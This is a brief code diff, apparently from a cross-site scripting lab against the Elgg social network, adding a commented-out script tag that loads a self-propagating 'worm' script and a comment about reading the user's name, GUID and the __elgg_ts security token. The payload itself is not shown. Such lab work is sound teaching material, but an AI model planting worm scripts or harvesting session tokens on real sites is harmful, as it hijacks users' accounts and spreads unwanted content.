@@ -1,5 +1,5 @@
 // <script id="worm" type="text/javascript"></script>
-
+// <script id="worm" type="text/javascript" src="http://localhost/task6.js"></script>
 
 window.onload = function() {
     //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
